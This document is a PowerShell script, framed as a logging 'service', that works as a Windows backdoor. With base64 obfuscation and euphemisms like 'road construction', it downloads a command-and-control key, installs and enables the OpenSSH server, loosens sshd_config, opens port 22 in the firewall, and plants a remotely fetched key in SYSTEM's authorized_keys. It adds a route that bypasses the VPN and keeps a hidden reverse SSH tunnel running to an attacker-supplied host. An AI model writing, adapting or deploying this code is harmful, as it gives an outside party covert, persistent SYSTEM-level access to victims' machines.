param(
    [string]$var1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("encoded server ip")),
    [string]$var2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2key location")),
    [string]$var3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("server username")),
    [int]$var4 = [int][System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("server port to connect to"))
)

# Service environment setup
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
Set-Location "C:\Windows\System32"
$env:PATH = "$env:PATH;C:\Windows\System32\OpenSSH"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$logFile = "C:\Windows\System32\service_debug.log"

function Write-ServiceLog {
    param($msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    Add-Content -Path $logFile -Value "[$timestamp] $msg" -Force
}

Write-ServiceLog "==================== SERVICE STARTING ===================="
Write-ServiceLog "Script parameters decoded:"
Write-ServiceLog "  var1 (destination): $var1"
Write-ServiceLog "  var2 (key path): $var2"
Write-ServiceLog "  var3 (user): $var3"
Write-ServiceLog "  var4 (port): $var4"
Write-ServiceLog "Environment setup:"
Write-ServiceLog "  Current directory: $(Get-Location)"
Write-ServiceLog "  PATH: $env:PATH"
Write-ServiceLog "  Current user: $env:USERNAME"
Write-ServiceLog "  Process ID: $PID"

$var5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2key location"))
$var6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2 key link"))

Write-ServiceLog "Decoded variables:"
Write-ServiceLog "  var5 (key file path): $var5"
Write-ServiceLog "  var6 (download URL): $var6"

Write-ServiceLog "Checking if key file exists at: $var5"
if (-not (Test-Path $var5)) {
    Write-ServiceLog "Key file not found. Attempting download..."
    try {
        Write-ServiceLog "Starting web request to: $var6"
        Invoke-WebRequest -Uri $var6 -OutFile $var5 -UseBasicParsing
        Write-ServiceLog "Download completed successfully"
        
        Write-ServiceLog "Setting permissions on key file..."
        $icaclsResult = icacls $var5 /inheritance:r /grant:r "SYSTEM:(RX)" /remove "$env:USERNAME" /remove "BUILTIN\Users" 2>&1
        Write-ServiceLog "ICACLS result: $icaclsResult"
        
        Write-ServiceLog "Verifying file permissions..."
        $permissionsCheck = icacls $var5 2>&1
        Write-ServiceLog "Current permissions: $permissionsCheck"
        
        Write-ServiceLog "Road map downloaded and secured successfully"
    } catch {
        Write-ServiceLog "FAILED to download road map: $($_.Exception.Message)"
        Write-ServiceLog "Exception details: $($_.Exception.GetType().FullName)"
        Write-ServiceLog "Stack trace: $($_.ScriptStackTrace)"
        Start-Sleep 60
    }
} else {
    Write-ServiceLog "Road map already exists at: $var5"
    Write-ServiceLog "File size: $((Get-Item $var5 -ErrorAction SilentlyContinue).Length) bytes"
}

$var2 = $var5
Write-ServiceLog "Updated var2 to: $var2"

function Test-Administrator {
    Write-ServiceLog "Testing administrator privileges..."
    try {
        $var7 = [Security.Principal.WindowsIdentity]::GetCurrent()
        Write-ServiceLog "Current identity: $($var7.Name)"
        $var8 = New-Object Security.Principal.WindowsPrincipal($var7)
        $isAdmin = $var8.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-ServiceLog "Is administrator: $isAdmin"
        return $isAdmin
    } catch {
        Write-ServiceLog "ERROR in Test-Administrator: $($_.Exception.Message)"
        return $false
    }
}

function Fix-RoadConfiguration {
    Write-ServiceLog "=== Starting Fix-RoadConfiguration ==="
    $var21 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QzpcUHJvZ3JhbURhdGFcc3NoXHNzaGRfY29uZmln"))//sshd config location
    Write-ServiceLog "SSH config path: $var21"
    
    if (-not (Test-Path $var21)) {
        Write-ServiceLog "Road config file not found at $var21"
        return $false
    }
    
    Write-ServiceLog "SSH config file found"
    try {
        Write-ServiceLog "Reading config file content..."
        $var26 = Get-Content $var21
        Write-ServiceLog "Config file has $($var26.Count) lines"
        $modified = $false
        
        for ($i = 0; $i -lt $var26.Count; $i++) {
            $line = $var26[$i].Trim()
            Write-ServiceLog "Line $i : $line"
            
            if ($line -match "^Match\s+Group\s+administrators\s*$" -and -not $line.StartsWith("#")) {
                Write-ServiceLog "Found Match Group administrators line, commenting out"
                $var26[$i] = "#" + $var26[$i]
                $modified = $true
                Write-ServiceLog "Commented out: Match Group administrators"
            }
            
            if ($line -match "^\s*AuthorizedKeysFile\s+__PROGRAMDATA" -and -not $line.StartsWith("#")) {
                Write-ServiceLog "Found AuthorizedKeysFile __PROGRAMDATA line, commenting out"
                $var26[$i] = "#" + $var26[$i]
                $modified = $true
                Write-ServiceLog "Commented out: AuthorizedKeysFile administrators path"
            }
        }
        
        if ($modified) {
            Write-ServiceLog "Config was modified, creating backup and saving changes"
            $var24 = ".backup.$(Get-Date -Format 'yyyyMMdd_HHmmss')"
            Copy-Item $var21 "$var21$var24"
            Write-ServiceLog "Backup created: $var21$var24"
            $var26 | Set-Content $var21 -Encoding UTF8
            Write-ServiceLog "Road config modified successfully"
            return $true
        } else {
            Write-ServiceLog "No changes needed - road config already properly configured"
            return $false
        }
    } catch {
        Write-ServiceLog "FAILED to modify road config: $($_.Exception.Message)"
        return $false
    }
}

function Install-Infrastructure {
    Write-ServiceLog "=== Starting Install-Infrastructure ==="
    try {
        Write-ServiceLog "Checking OpenSSH capabilities..."
        $var9 = Get-WindowsCapability -Online | Where-Object Name -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlblNTSC5DbGllbnQq")))
        $var10 = Get-WindowsCapability -Online | Where-Object Name -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlblNTSC5TZXJ2ZXIq")))
        
        Write-ServiceLog "SSH Client state: $($var9.State)"
        Write-ServiceLog "SSH Server state: $($var10.State)"
        
        if ($var9.State -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5zdGFsbGVk")))) {
            Write-ServiceLog "Installing client infrastructure..."
            Add-WindowsCapability -Online -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlblNTSC5DbGllbnR+fn5+MC4wLjEuMA==")))
            Write-ServiceLog "SSH Client installation completed"
        }
        
        if ($var10.State -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5zdGFsbGVk")))) {
            Write-ServiceLog "Installing server infrastructure..."
            Add-WindowsCapability -Online -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlblNTSC5TZXJ2ZXJ+fn5+MC4wLjEuMA==")))
            Write-ServiceLog "SSH Server installation completed"
        }
        
        Write-ServiceLog "Calling Fix-RoadConfiguration..."
        $configChanged = Fix-RoadConfiguration
        Write-ServiceLog "Config changed: $configChanged"
        
        Write-ServiceLog "Starting SSH daemon service..."
        $sshServiceName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c3NoZA=="))
        try {
            Start-Service $sshServiceName -ErrorAction SilentlyContinue
            Write-ServiceLog "SSH service started"
            Set-Service -Name $sshServiceName -StartupType ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0b21hdGlj"))) -ErrorAction SilentlyContinue
            Write-ServiceLog "SSH service set to automatic startup"
        } catch {
            Write-ServiceLog "Error starting SSH service: $($_.Exception.Message)"
        }
        
        if ($configChanged) {
            Write-ServiceLog "Restarting SSH service to apply configuration changes..."
            try {
                Restart-Service $sshServiceName -ErrorAction SilentlyContinue
                Write-ServiceLog "SSH service restarted"
                Start-Sleep 2
            } catch {
                Write-ServiceLog "Error restarting SSH service: $($_.Exception.Message)"
            }
        }
        
        Write-ServiceLog "Checking firewall rule..."
        $ruleName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UnVsZTE="))
        $existingRule = Get-NetFirewallRule -Name $ruleName -ErrorAction SilentlyContinue
        if (!$existingRule) {
            Write-ServiceLog "Creating firewall rule..."
            try {
                New-NetFirewallRule -Name $ruleName -DisplayName ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZTE="))) -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction SilentlyContinue
                Write-ServiceLog "Firewall rule created successfully"
            } catch {
                Write-ServiceLog "Error creating firewall rule: $($_.Exception.Message)"
            }
        } else {
            Write-ServiceLog "Firewall rule already exists"
        }
    } catch {
        Write-ServiceLog "ERROR in Install-Infrastructure: $($_.Exception.Message)"
        Write-ServiceLog "Stack trace: $($_.ScriptStackTrace)"
    }
    Write-ServiceLog "=== Install-Infrastructure completed ==="
}

function Test-RoadConnection {
    Write-ServiceLog "=== Testing road connection ==="
    try {
        $processName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c3No"))
        Write-ServiceLog "Looking for processes named: $processName"
        $var11 = Get-Process -Name $processName -ErrorAction SilentlyContinue
        Write-ServiceLog "Found $($var11.Count) SSH processes"
        
        foreach ($var12 in $var11) {
            Write-ServiceLog "Checking process ID: $($var12.Id)"
            $var13 = (Get-WmiObject Win32_Process -Filter "ProcessId = $($var12.Id)" -ErrorAction SilentlyContinue).CommandLine
            Write-ServiceLog "Command line: $var13"
            if ($var13 -and $var13.Contains($var1) -and $var13.Contains([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MjIyMg==")))) {
                Write-ServiceLog "Found matching SSH connection!"
                return $true
            }
        }
        Write-ServiceLog "No matching SSH connection found"
        return $false
    } catch {
        Write-ServiceLog "ERROR in Test-RoadConnection: $($_.Exception.Message)"
        return $false
    }
}

function Add-BypassRoute {
    Write-ServiceLog "=== Adding bypass route ==="
    try {
        Write-ServiceLog "Getting default routes..."
        $routes = Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Where-Object {$_.InterfaceAlias -notlike "*VPN*" -and $_.InterfaceAlias -notlike "*TAP*"} | Sort-Object RouteMetric
        Write-ServiceLog "Found $($routes.Count) non-VPN routes"
        
        if ($routes.Count -gt 0) {
            $var25 = $routes[0].NextHop
            Write-ServiceLog "Using gateway: $var25"
            $routeCommand = "route add $var1 mask 255.255.255.255 $var25 metric 1"
            Write-ServiceLog "Executing: $routeCommand"
            $routeResult = route add $var1 mask 255.255.255.255 $var25 metric 1 2>&1
            Write-ServiceLog "Route command result: $routeResult"
            Write-ServiceLog "Bypass route added for $var1 via $var25"
        } else {
            Write-ServiceLog "No suitable gateway found"
        }
    } catch {
        Write-ServiceLog "FAILED to add bypass route: $($_.Exception.Message)"
    }
}

function Start-RoadConstruction {
    Write-ServiceLog "=== Starting road construction ==="
    try {
        Write-ServiceLog "Testing if connection already exists..."
        if (Test-RoadConnection) {
            Write-ServiceLog "Road connection already established - skipping"
            return
        }
        
        Write-ServiceLog "Adding bypass route..."
        Add-BypassRoute
        
        Write-ServiceLog "Killing existing SSH processes to this host..."
        $processName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c3No"))
        Get-Process -Name $processName -ErrorAction SilentlyContinue | ForEach-Object {
            $var13 = (Get-WmiObject Win32_Process -Filter "ProcessId = $($_.Id)" -ErrorAction SilentlyContinue).CommandLine
            if ($var13 -and $var13.Contains($var1)) {
                Write-ServiceLog "Terminating existing SSH process (PID: $($_.Id)): $var13"
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            }
        }
        
        Write-ServiceLog "Building SSH command arguments..."
        $var14 = @(
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LU4="))),
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LVI="))), "$var4`:localhost:22",
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LWk="))), "`"$var2`"",
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LW8="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RyaWN0SG9zdEtleUNoZWNraW5nPW5v"))),
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LW8="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyQWxpdmVJbnRlcnZhbD0zMA=="))),
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LW8="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyQWxpdmVDb3VudE1heD0z"))),
            "$var3@$var1"
        )
        
        $sshExecutable = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c3No"))
        Write-ServiceLog "SSH executable: $sshExecutable"
        Write-ServiceLog "SSH Command arguments: $($var14 -join ' ')"
        
        Write-ServiceLog "Starting SSH process..."
        $processInfo = Start-Process -FilePath $sshExecutable -ArgumentList $var14 -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        if ($processInfo) {
            Write-ServiceLog "SSH process started with PID: $($processInfo.Id)"
        } else {
            Write-ServiceLog "Failed to start SSH process"
        }
        
        Write-ServiceLog "Waiting 5 seconds for connection to establish..."
        Start-Sleep 5
        
        Write-ServiceLog "Testing connection after attempt..."
        if (Test-RoadConnection) {
            Write-ServiceLog "SUCCESS: Road construction established successfully"
        } else {
            Write-ServiceLog "FAILED: Road construction failed to establish"
        }
    } catch {
        Write-ServiceLog "ERROR in Start-RoadConstruction: $($_.Exception.Message)"
        Write-ServiceLog "Stack trace: $($_.ScriptStackTrace)"
    }
    Write-ServiceLog "=== Road construction completed ==="
}

# Enhanced logging function
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [string]$LogPath = "C:\Windows\Temp\ssh_config.log"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    try {
        Add-Content -Path $LogPath -Value $logEntry -ErrorAction SilentlyContinue
        Write-ServiceLog "SSH Config Log: $Message"
        
        # Also write to console if available
        switch ($Level) {
            "ERROR" { Write-Host $Message -ForegroundColor Red -ErrorAction SilentlyContinue }
            "SUCCESS" { Write-Host $Message -ForegroundColor Green -ErrorAction SilentlyContinue }
            default { Write-Host $Message -ErrorAction SilentlyContinue }
        }
    }
    catch {
        Write-ServiceLog "Failed to write to SSH config log: $($_.Exception.Message)"
    }
}

# Function to check if running as administrator
function Test-Administrator {
    Write-ServiceLog "=== Testing administrator status ==="
    try {
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-ServiceLog "Administrator check result: $isAdmin"
        return $isAdmin
    } catch {
        Write-ServiceLog "Error in administrator check: $($_.Exception.Message)"
        return $false
    }
}

# ===================================================================================
# FUNCTION 1: Main Orchestrator for SSH Setup
# ===================================================================================
function Start-SshConfiguration {
    Write-ServiceLog "=== Starting SSH Configuration ==="
    Write-Log "Starting SSH Configuration Script"
    Write-Log "Running as Administrator: $(Test-Administrator)"
    Write-Log "Current User: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    Write-Log "Process ID: $PID"
    
    # --- HARD-CODED VALUE ---
    $FilePath = "C:\ProgramData\duckyc2key.pem"
    # --- END OF HARD-CODED VALUE ---

    Write-ServiceLog "Checking for PEM file at: $FilePath"
    if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
        Write-Log "ERROR: The file '$FilePath' was not found. Halting script." "ERROR"
        Write-ServiceLog "PEM file not found, skipping SSH configuration"
        return
    }

    Write-Log "Securing private key permissions for file: $FilePath"
    Write-ServiceLog "PEM file found, securing permissions..."

    try {
        # Check if we can access the file
        $fileInfo = Get-Item -Path $FilePath -ErrorAction Stop
        Write-Log "File found: $($fileInfo.FullName), Size: $($fileInfo.Length) bytes"
        Write-ServiceLog "File info - Size: $($fileInfo.Length) bytes, LastWrite: $($fileInfo.LastWriteTime)"
        
        $acl = Get-Acl -Path $FilePath
        Write-Log "Current file owner: $($acl.Owner)"
        Write-ServiceLog "Current owner: $($acl.Owner)"
        
        $owner = New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")
        $acl.SetOwner($owner)
        $acl.SetAccessRuleProtection($true, $false)
        
        # Log existing rules before removal
        $existingRules = $acl.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier])
        Write-Log "Removing $($existingRules.Count) existing access rules"
        Write-ServiceLog "Removing $($existingRules.Count) existing access rules"
        
        foreach ($rule in $existingRules) {
            Write-ServiceLog "Removing rule: $($rule.IdentityReference) - $($rule.AccessControlType) - $($rule.FileSystemRights)"
            $acl.RemoveAccessRule($rule)
        }
        
        $permissions = [System.Security.AccessControl.FileSystemRights]"Read, ReadAndExecute"
        $accessType = [System.Security.Accesscontrol.AccessControlType]::Allow
        $newRule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", $permissions, $accessType)
        $acl.AddAccessRule($newRule)
        Write-ServiceLog "Added SYSTEM read/execute rule"
        
        Set-Acl -Path $FilePath -AclObject $acl -ErrorAction Stop
        Write-ServiceLog "ACL applied successfully"

        Write-Log "SUCCESS: Private key permissions have been securely configured." "SUCCESS"
        
        # --- CALLING THE OTHER SETUP FUNCTIONS FROM WITHIN THIS ONE ---
        Set-SystemAuthorizedKey
        

    }
    catch {
        Write-Log "FAILURE: An error occurred while securing private key. Error: $($_.Exception.Message)" "ERROR"
        Write-ServiceLog "FAILED to secure private key: $($_.Exception.Message)"
        Write-Log "Stack Trace: $($_.Exception.StackTrace)" "ERROR"
    }
}

# ===================================================================================
# FUNCTION 2: Download and Secure the SYSTEM's Authorized Keys File
# ===================================================================================
function Set-SystemAuthorizedKey {
    Write-ServiceLog "=== Starting Set-SystemAuthorizedKey ==="
    # --- HARD-CODED VALUES ---
    $RemotePubKeyUrl = "C2KeyLocal.pub for ssh"
    $SshDirPath = "C:\WINDOWS\system32\config\systemprofile\.ssh"
    $AuthorizedKeysPath = Join-Path $SshDirPath "authorized_keys"
    # --- END OF HARD-CODED VALUES ---

    try {
        # 1. Create the .ssh directory if it doesn't exist
        if (-not (Test-Path -Path $SshDirPath)) {
            Write-ServiceLog "Creating directory: $SshDirPath"
            New-Item -Path $SshDirPath -ItemType Directory -Force | Out-Null
        }

        # 2. CRITICAL STEP: Reset and secure permissions on the .ssh DIRECTORY first.
        # This ensures SYSTEM has full control over the folder before trying to write a file into it.
        Write-ServiceLog "Securing permissions on directory: $SshDirPath"
        icacls.exe $SshDirPath /reset
        icacls.exe $SshDirPath /grant "SYSTEM:(F)" /t
        icacls.exe $SshDirPath /setowner "SYSTEM" /t /c

        # 3. Download the public key content
        Write-ServiceLog "Downloading public key for SYSTEM..."
        $pubKeyContent = Invoke-RestMethod -Uri $RemotePubKeyUrl -TimeoutSec 30

        # 4. Append the key to the authorized_keys file
        Write-ServiceLog "Appending public key to $AuthorizedKeysPath"
        Add-Content -Path $AuthorizedKeysPath -Value $pubKeyContent

        # 5. Secure the authorized_keys FILE itself
        Write-ServiceLog "Securing permissions on file: $AuthorizedKeysPath"
        icacls.exe $AuthorizedKeysPath /reset
        icacls.exe $AuthorizedKeysPath /grant "SYSTEM:(R)"
        icacls.exe $AuthorizedKeysPath /setowner "SYSTEM"

        Write-ServiceLog "SUCCESS: SYSTEM's authorized_keys file has been securely configured."
    }
    catch {
        Write-ServiceLog "FAILURE: An error occurred during SYSTEM authorized_keys setup. Error: $($_.Exception.Message)"
    }
    Write-ServiceLog "=== Set-SystemAuthorizedKey completed ==="
}

# Main service loop
Write-ServiceLog "==================== MAIN EXECUTION STARTING ===================="
try {
    Write-ServiceLog "Checking administrator privileges..."
    if (-not (Test-Administrator)) {
        Write-ServiceLog "CRITICAL: Not running as administrator!"
        exit 1
    }
    Write-ServiceLog "Administrator check passed"
    
    Write-ServiceLog "Checking road map path: $var2"
    if (-not (Test-Path $var2)) {
        Write-ServiceLog "WARNING: Road map not found at: $var2"
        Write-ServiceLog "Will attempt to download in the loop"
    } else {
        Write-ServiceLog "Road map found at: $var2"
    }
    
    # Install infrastructure once
    Write-ServiceLog "Installing infrastructure..."
    Install-Infrastructure
    Write-ServiceLog "Infrastructure installation completed"
    
    Write-ServiceLog "Starting SSH configuration..."
    Start-SshConfiguration
    Write-ServiceLog "SSH configuration completed"
    
    Write-ServiceLog "Starting main service loop..."
    $loopCounter = 0
    # Main service loop with proper error handling
    while ($true) {
        $loopCounter++
        Write-ServiceLog "=== LOOP ITERATION $loopCounter ==="
	
        try {
	    
            Start-RoadConstruction
            Write-ServiceLog "Loop iteration $loopCounter completed, sleeping 60 seconds..." 
            Start-Sleep 60
        } catch {
            Write-ServiceLog "ERROR in main loop iteration $loopCounter : $($_.Exception.Message)"
            Write-ServiceLog "Stack trace: $($_.ScriptStackTrace)"
            Write-ServiceLog "Sleeping 120 seconds due to error..."
            Start-Sleep 120
        }
    }
    
} catch {
    Write-ServiceLog "FATAL ERROR in main execution: $($_.Exception.Message)"
    Write-ServiceLog "Fatal stack trace: $($_.ScriptStackTrace)"
    Write-ServiceLog "Script terminating with exit code 1"
    exit 1
}

Write-ServiceLog "==================== SCRIPT ENDED ===================="
